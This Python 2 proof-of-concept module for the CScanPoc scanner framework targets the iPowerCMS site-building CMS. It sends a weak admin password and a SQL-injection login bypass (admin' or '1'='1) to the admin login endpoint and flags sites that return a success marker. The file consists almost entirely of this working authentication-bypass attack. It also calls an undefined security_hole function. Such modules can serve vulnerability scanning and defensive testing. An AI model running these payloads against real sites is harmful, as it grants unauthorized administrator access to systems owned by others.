# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    poc_id = '044b3690-2649-40d6-9f1e-da6c51064744'
    name = '鼎维iPowerCMS建站CMS建站弱口令、万能密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-04-28'  # 漏洞公布时间
    desc = '''
        鼎维iPowerCMS建站CMS存在两处高危漏洞：建站弱口令、万能密码。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'iPowerCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f64fef3d-5b13-4916-9b57-7d9679be27ad'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0110152
            hh = hackhttp.hackhttp()
            payloads = [
                "/m/manager/login.xml.php?username=admin&password=1&vcode=",
                "/m/manager/login.xml.php?username=admin'%20or%20'1'='1&password=1&vcode="
            ]
            for payload in payloads:
                target = self.target + payload
                code, head, body, errcode, final_url = hh.http(target);
                if '<v>1</v>' in body:
                    security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
